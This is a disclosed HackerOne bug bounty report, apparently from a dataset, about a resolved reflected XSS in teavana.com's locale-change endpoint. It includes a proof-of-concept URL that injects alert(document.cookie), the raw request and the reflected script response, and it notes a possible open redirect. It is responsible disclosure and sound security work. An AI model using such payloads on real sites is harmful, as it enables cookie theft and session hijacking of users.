---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '190798'
original_report_id: '190798'
title: Reflected XSS on teavana.com (Locale-Change)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2016-12-13T11:40:29.111Z'
disclosed_at: '2017-06-09T00:00:19.014Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS on teavana.com (Locale-Change)

## Metadata

- HackerOne Report ID: 190798
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2017-06-09T00:00:19.014Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

SUMMARY
----
Hello, the link at https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=en_CA (was identified by changing languages) is prone to reflected XSS in the "en" zone of the LocaleID parameter. One can inject javascript that will be reflected back to the target while calling the modified link. 

POC
-----
https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(document.cookie);//an_CA

This injection is possible because the contents before the _CA are not validated and it will be injected in the response.

Request :

```
GET /on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA HTTP/1.1
Host: www.teavana.com
```

Response :

```
<script type="text/javascript">
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
uri=decodeURIComponent(uri);
if(uri.indexOf("/ca/en") >=0){
  uri=uri.replace("/ca/en","");
}
else if(uri.indexOf("/ca/fr") >=0){
  uri=uri.replace("/ca/fr","");
}
window.location = uri;
</script>
```

Note the : var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';

This can also be modified to easily make an open redirect.

Also attached screenshot.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
